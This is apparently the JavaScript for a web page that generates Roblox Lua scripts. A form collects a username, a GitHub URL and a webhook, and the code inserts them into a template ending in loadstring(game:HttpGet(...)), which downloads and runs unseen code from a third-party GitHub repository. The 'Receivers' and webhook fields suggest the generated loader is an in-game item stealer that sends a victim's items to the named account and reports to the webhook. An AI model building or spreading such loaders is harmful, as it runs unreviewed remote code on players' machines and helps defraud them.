const scriptForm = document.getElementById("scriptForm");
const outputSection = document.getElementById("output");
const scriptBox = document.getElementById("scriptBox");
const copyBtn = document.getElementById("copyBtn");
const downloadBtn = document.getElementById("downloadBtn");

const tutorialBtn = document.getElementById("tutorialBtn");
const backBtn = document.getElementById("backBtn");

const tutorialPage = document.getElementById("tutorialPage");
const mainContent = document.querySelector("main");

// Helper to add fadeIn animation and remove it after completion
function fadeIn(element) {
  element.classList.add("fadeIn");
  element.addEventListener("animationend", function handler() {
    element.classList.remove("fadeIn");
    element.removeEventListener("animationend", handler);
  });
}

// Helper to fadeOut then run callback after animation completes
function fadeOut(element, callback) {
  element.classList.add("fadeOut");
  element.addEventListener("animationend", function handler() {
    element.classList.remove("fadeOut");
    element.removeEventListener("animationend", handler);
    callback();
  });
}

// Show tutorial page with fade animation
tutorialBtn.addEventListener("click", () => {
  fadeOut(scriptForm, () => {
    scriptForm.classList.add("hidden");
    tutorialPage.classList.remove("hidden");
    fadeIn(tutorialPage);
  });
});

// Hide tutorial page and show main form with fade animation
backBtn.addEventListener("click", () => {
  fadeOut(tutorialPage, () => {
    tutorialPage.classList.add("hidden");
    scriptForm.classList.remove("hidden");
    fadeIn(scriptForm);
  });
});

// Handle form submission (just example, adapt as you want)
scriptForm.addEventListener("submit", (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value.trim();
  const github = document.getElementById("github").value.trim();
  const webhook = document.getElementById("webhook").value.trim();

  if (!username || !github || !webhook) {
    alert("Please fill in all fields");
    return;
  }

  const script = 
`Config = {
  Receivers = {"${username}"},
  Webhook = "${webhook}",
  ScriptURL = "${github}",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()`;

  scriptBox.textContent = script;
  outputSection.classList.remove("hidden");
  outputSection.scrollIntoView({ behavior: "smooth" });
});

// Copy script to clipboard
copyBtn.addEventListener("click", () => {
  navigator.clipboard.writeText(scriptBox.textContent).then(() => {
    copyBtn.textContent = "✅ Copied!";
    setTimeout(() => (copyBtn.textContent = "📋 Copy"), 1500);
  });
});

// Download script as .lua file
downloadBtn.addEventListener("click", () => {
  const blob = new Blob([scriptBox.textContent], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "script.lua";
  a.click();
  URL.revokeObjectURL(url);
});